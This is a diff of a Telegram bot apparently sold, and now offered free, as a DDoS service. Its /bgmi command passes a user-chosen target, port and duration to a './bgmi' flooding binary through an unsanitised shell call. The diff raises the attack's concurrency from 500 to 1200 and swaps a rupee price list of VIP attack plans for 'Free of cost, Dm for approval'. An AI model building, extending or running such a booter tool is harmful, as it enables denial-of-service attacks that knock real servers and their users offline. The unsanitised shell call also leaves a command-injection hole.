@@ -242,13 +242,13 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 500"
+                full_command = f"./bgmi {target} {port} {time} 1200"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
         else:
             response = "Usage :- /bgmi <target> <port> <time>\nBy Devloper @IronStriker"  # Updated command syntax
     else:
-        response = "You Are Not Authorized To Use This Command.\nBy Devloper @IronStriker"
+        response = "You Are Not Authorized To Use This Command.\n Devloper @IronStriker"
 
     bot.reply_to(message, response)
 
@@ -285,7 +285,7 @@ def show_help(message):
 
  To See Admin Commands:
  /admincmd : Shows All Admin Commands.
- By Devloper @IronStriker
+ Devloper @IronStriker
 '''
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
@@ -320,16 +320,9 @@ def welcome_plan(message):
     user_name = message.from_user.first_name
     response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:
 
-Vip :
--> Attack Time : 200 (S)
-> After Attack Limit : 2 Min
--> Concurrents Attack : 300
-
-Pr-ice List:
-Day-->150 Rs
-Week-->900 Rs
-Month-->1600 Rs
-By Devloper @IronStriker
+Free of cost 
+Dm for approval 
+Devloper @IronStriker
 '''
     bot.reply_to(message, response)
 
@@ -344,7 +337,7 @@ def welcome_plan(message):
 /logs : All Users Logs.
 /broadcast : Broadcast a Message.
 /clearlogs : Clear The Logs File.
-By Devloper @IronStriker
+Devloper @IronStriker
 '''
     bot.reply_to(message, response)
 
@@ -375,4 +368,4 @@ def broadcast_message(message):
 
 
 bot.polling()
-#By Devloper @IronStriker
+# Devloped by @IronStriker
